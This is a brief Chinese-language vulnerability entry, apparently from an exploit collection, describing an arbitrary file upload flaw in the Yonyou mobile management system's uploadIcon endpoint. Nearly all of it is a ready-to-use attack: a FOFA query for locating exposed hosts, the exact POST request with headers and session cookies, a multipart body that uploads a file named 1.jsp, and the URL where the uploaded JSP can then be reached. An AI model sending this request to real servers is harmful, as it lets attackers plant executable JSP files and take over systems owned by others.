# 用友移动管理系统uploadIcon任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`fofa：`app="用友-移动系统管理"``
- **请求**：`POST /maportal/news/uploadIcon?imgName=1 HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 199`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySbYrtv3S…`　`Cookie: JSESSIONID=30E66C13BE85EAFC1843D1497506E41E.server; JSESSIONID=078CECE35E09DA91C…`

**请求体 / payload**
```
------WebKitFormBoundarySbYrtv3SZkqRLRNS
Content-Disposition: form-data; name="iconFile"; filename="1.jsp"
Content-Type: application/octet-stream
123
------WebKitFormBoundarySbYrtv3SZkqRLRNS—

上传文件位置
http://xx.xx.xx.xx/maupload/news/1.jsp
```

**其他**
- 用友移动管理系统uploadIcon任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友移动管理系统